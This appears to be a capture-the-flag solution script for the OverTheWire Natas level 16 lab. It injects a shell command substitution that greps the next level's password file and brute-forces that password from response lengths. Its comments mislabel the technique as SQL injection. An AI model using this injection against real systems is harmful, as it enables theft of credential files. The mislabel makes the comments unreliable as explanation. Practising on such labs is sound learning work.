import string
import aiohttp
import asyncio
from halo import Halo


async def get_password_request(session, data, character):
    url = "http://natas16.natas.labs.overthewire.org/"
    async with session.post(url, data=data) as response:

        return await response.text(), character


async def get_password(session):
    spinner = Halo(text='The password for natas 17 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    characters = string.ascii_letters + string.digits
    natas17_password = ""

    for _ in range(32):
        tasks = []

        for character in characters:
            # If "African" is in the HTML body it means the SQLinjection was not succesfull
            payload = f"African$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
            data = {"needle": payload}
            tasks.append(asyncio.ensure_future(get_password_request(session, data, character)))

        requests = await asyncio.gather(*tasks)
        for response in requests:
            """
            The get_password_request return the HTML of the request and the character for the SQLinjection,
            it keeps the html in response[0] and the character in response[1].
            """
            if len(response[0]) != 1122:
                natas17_password += response[1]
                spinner.stop()
                spinner = Halo(text='The password for natas 17 is: ' + natas17_password,
                            spinner='bouncingBar', color="blue")
                spinner.start()
    spinner.succeed(text="The password for natas 17 is: " + natas17_password)

    return natas17_password


async def make_session(natas16_password):
    """
    Create a session and start running an asynchronous function
    that exploits the SQLinjection in natas 16.
    """
    auth = aiohttp.BasicAuth("natas16", natas16_password)
    async with aiohttp.ClientSession(auth=auth) as session:
        natas17_password = await get_password(session)

    return natas17_password


def get_natas17_password(natas16_password):
    """
    Create an event loop and run an asynchronous function.
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    natas17_password = asyncio.run(make_session(natas16_password))

    return natas17_password


if __name__ == "__main__":
    natas16_password = ""  # Put here the password for natas16 here
    get_natas17_password(natas16_password)
